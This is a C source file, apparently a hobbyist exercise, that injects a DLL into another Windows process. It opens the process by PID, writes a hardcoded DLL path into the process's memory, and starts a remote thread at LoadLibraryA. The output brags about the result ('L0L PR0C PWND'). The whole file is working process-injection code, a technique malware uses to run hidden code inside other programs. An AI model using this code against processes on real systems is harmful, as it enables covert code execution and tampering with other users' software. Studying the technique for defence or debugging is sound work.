#include <Windows.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <stdio.h>
#include <stdlib.h>

char dll_name[] = "C:\\Users\\Wave\\source\\repos\\woopz\\x64\\Debug\\woopz_trgt.dll";

// Thread function thats gonna be run in the memory of the remote proc
DWORD WINAPI ThreadProc(LPVOID lpParams) {
	// i know it never actually gets called, but its still funny. 
	// we can probs rework this so that we can load our own DLL
	// in the remote proc's memory, but crashing stuff was the goal
	AllocConsole();
	printf("Printing from remote thread :)\n");

	return EXIT_SUCCESS;
}

int main(int argc, char **argv)
{
	int proc_id = 0;
	
	if (argc != 2) {
		printf("[ERROR] Illegal argument count %d\n", argc);
		return 1;
	}
	// get the target process ID
	proc_id = atoi(argv[1]);

	printf("[INFO] Targeting process ID: %d\n", proc_id);

	getc(stdin);

	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, true, proc_id);

	if (!proc) {
		printf("[ERROR] Failed to open remote process: %d\n", GetLastError());
		return 2;
	}

	HMODULE hK32 = GetModuleHandle(L"kernel32.dll");

	LPVOID pLoadLib = (LPVOID)GetProcAddress(hK32, "LoadLibraryA");

	if (!pLoadLib) {
		printf("[ERROR] Failed to locate LoadLibraryA\n");
		CloseHandle(proc);
		return 3;
	}

	LPVOID lpSpace = (LPVOID)VirtualAllocEx(proc, NULL, strlen(dll_name), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	printf("[INFO] Loading string at address %p\n", lpSpace);

	if (!lpSpace) {
		printf("[ERROR] Failed to allocate memory in remote process\n");
		CloseHandle(proc);
		return 4;
	}

	if (!WriteProcessMemory(proc, lpSpace, dll_name, strlen(dll_name), NULL)) {
		printf("[ERROR] Failed to write data to proc memory\n");
		CloseHandle(proc);
		return 5;
	}

	// attempt to create remote thread
//	HANDLE hThread = CreateRemoteThread(proc, NULL, 0, ThreadProc, NULL, CREATE_SUSPENDED, NULL);
	HANDLE hThread = CreateRemoteThread(proc, NULL, 0, (PTHREAD_START_ROUTINE)pLoadLib, lpSpace, CREATE_SUSPENDED, NULL);

	if (!hThread) {
		printf("[ERROR] Failed to create remote thread: %d\n", GetLastError());
		CloseHandle(proc);
		return 6;
	}

	if (ResumeThread(hThread) == -1) {
		printf("[ERROR] Failed to resume remote thread: %d\n", GetLastError());
		CloseHandle(hThread);
		CloseHandle(proc);
		return 7;
	}


	Sleep(500);

	// we're done here
	CloseHandle(hThread);
	CloseHandle(proc);

	printf("[1337] L0L PR0C PWND\n");
	puts("PRESS ENTER TO CLOSE....");
	getc(stdin);

	return 0;
}
